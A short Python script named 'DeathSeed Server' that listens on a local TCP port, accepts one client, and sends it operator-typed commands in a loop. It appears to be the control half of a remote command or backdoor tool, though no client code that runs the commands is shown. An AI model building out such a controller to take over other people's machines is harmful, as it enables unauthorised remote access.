
# DeathSeed Server

import socket, os, time

os.system("cls && title DeathSeed Server")

ip = "127.0.0.1"
port = 50000


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen()

client, address = s.accept()

ipcli = client.recv(1024).decode()

print(ipcli, " has connected.")

while True:
    command = input("> ")
    client.send(command.encode())

